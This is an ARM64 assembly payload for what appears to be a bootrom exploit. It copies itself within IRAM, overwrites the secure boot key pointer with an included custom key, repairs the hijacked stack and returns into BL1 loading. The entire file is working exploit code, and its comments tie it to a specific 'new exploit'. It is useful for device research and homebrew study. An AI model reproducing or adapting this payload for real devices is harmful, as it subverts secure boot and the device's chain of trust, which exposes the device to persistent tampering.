.text
.global _start

//Boot using a custom secure boot key.
//NOTE: This payload was designed to use the new exploit, so the "e2" parameter, not the old one!

//First, we copy ourselves to later in IRAM so that our key remains in place after BL1 loads.
_start:
	b _stage1
	b _stage2

_stage1:
// self-copy
	ldr w0, _dst_ptr
	ldr w1, _bl1_ptr
	mov w2, 0x200 // size
	mov w4, w0
_copy:
	ldr x3, [x1], #8
	str x3, [x0], #8
	subs x2, x2, #8
	bne _copy
	add x4, x4, #0x4
	br x4

.align 4
_bl1_ptr: .dword 0x02021800
_dst_ptr: .dword 0x02069000


_stage2:
    //set pshold
    mov     x0, #0x330c
    movk    x0, #0x1048, lsl #16
    mov     w1, #0x5300
    str     w1, [x0]

    //set key ptr
    mov     x0, #0x006c
    movk    x0, #0x0202, lsl #16
    adr x1, key
    str     w1, [x0]

    //restore stack
    ldp x29, x30, [sp, #0x10]
    add sp, sp, #0x20
    ldp x19, x20, [sp, #0x10]
    ldp x21, x22, [sp, #0x20]
    ldp x23, x24, [sp, #0x30]
    ldp x29, x30, [sp, #0x40]
    add sp, sp, #0x50
    ldp x19, x29, [sp]
    ldr x30, [sp, #0x10]
    add sp, sp, #0x20
    ldp x19, x20, [sp]
    ldp x29, x30, [sp, #0x10]
    add sp, sp, #0x20
    
    //clear cache
    dsb sy
    ic iallu
    dsb sy
    isb

    //jump back to loading BL1
    br x19

.align 4
key:
.include "inc/sha256key.S"
